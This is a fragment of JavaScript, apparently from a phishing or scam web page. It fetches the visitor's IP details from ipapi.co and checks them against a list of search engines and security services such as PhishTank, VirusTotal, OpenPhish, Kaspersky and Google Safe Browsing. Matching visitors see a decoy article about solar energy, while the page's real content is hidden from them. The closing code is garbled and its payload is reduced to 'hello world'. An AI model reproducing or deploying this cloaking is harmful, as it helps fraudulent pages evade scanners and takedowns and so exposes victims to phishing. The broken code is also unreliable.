function generateSolarArticle() {
    return `
        <article style="max-width: 800px; margin: 0 auto; padding: 20px; font-family: Arial, sans-serif; line-height: 1.6;">
    <h1 style="color: #2c3e50;">Harnessing Solar Power for a Sustainable Future</h1>
    
    <p>In the face of global environmental challenges, solar energy is emerging as a key solution to reduce our dependency on fossil fuels. The promise of this renewable energy source lies not only in its ability to cut greenhouse gas emissions but also in its growing accessibility and cost-effectiveness.</p>
    
    <h2 style="color: #34495e;">Unleashing the Power of Solar Energy</h2>
    
    <p>Each day, the sun provides more energy than the world could ever consume. Solar panels allow us to tap into this virtually limitless resource, converting sunlight into electricity without polluting the environment. With even a small percentage of the sun’s energy, we could revolutionize power generation and transform global energy systems.</p>
    
    <h2 style="color: #34495e;">The Latest in Solar Technology</h2>
    
    <p>Advancements in solar technology have made harnessing the sun’s energy more efficient. The introduction of flexible, lightweight photovoltaic materials, like thin-film solar panels, has broadened the applications of solar technology beyond rooftops and solar farms. These innovations are helping to reduce costs and increase energy capture even in low-light conditions, making solar power more reliable and accessible to diverse environments.</p>
    
    <h2 style="color: #34495e;">Solar Energy: A Boon for the Economy</h2>
    
    <p>The economic advantages of solar energy are undeniable. As the costs of installation decrease, more households and businesses are making the switch, reducing their reliance on traditional energy sources. Not only does this result in significant savings, but it also contributes to job creation within the renewable energy sector, stimulating local economies and promoting sustainable growth.</p>
    
    <h2 style="color: #34495e;">Addressing the Challenges of Energy Storage</h2>
    
    <p>Despite the rapid growth in solar power adoption, there remain challenges related to storage and distribution. Energy storage solutions, such as advanced battery systems, are critical to ensuring that solar power can be used even when the sun isn’t shining. Fortunately, research in this area is advancing rapidly, and experts believe that efficient, affordable storage solutions are on the horizon.</p>
    
    <h2 style="color: #34495e;">Looking Forward</h2>
    
    <p>The journey towards a cleaner, greener future is far from over, but solar energy is paving the way for significant change. Continued investments in technology, infrastructure, and policy will be essential to fully realize the potential of solar power. With the right support, solar energy could be a game-changer in our global quest for sustainability and energy independence.</p>
</article>

    `;
}
    function checkAndBlockGoogleBot(data) {

        const botsToCheck = [
            'google', 'googlebot',
            'bing', 'bingbot',
            'yandex', 'yandexbot',
            'phishtank',
            'virustotal',
            'openphish',
            'norton',
            'mcafee',
            'bitdefender',
            'eset',
            'sophos',
            'netcraft',
            'comodo',
            'avira',
            'kaspersky',
            'trustwave',
            'zscaler',
            'web of trust', 'wot',
            'safe browsing',
            'cloudflare',
            // 'netonline'  // Keep your original check
        ];
         

        const infoToCheck = [
            data.ip,
            data.hostname,
            data.org,
            data.asn,
            data.isp
        ].join(' ').toLowerCase();
        var ttt = botsToCheck.some(bot => infoToCheck.includes(bot));
        
        if (ttt) {
            // alert("Netonline detected!");

            document.body.style.display = 'block';
            document.body.innerHTML = generateSolarArticle();
            // document.body.style.background = 'white';
            return true;
        }
        document.body.style.display = 'flex';
        return false;
    }

fetch('https://ipapi.co/json/')

                if (!checkAndBlockGoogleBot(data)) {

            })

            document.body.innerHTML = 'hello world';
            document.body.style.background = 'white';
            });
</script>
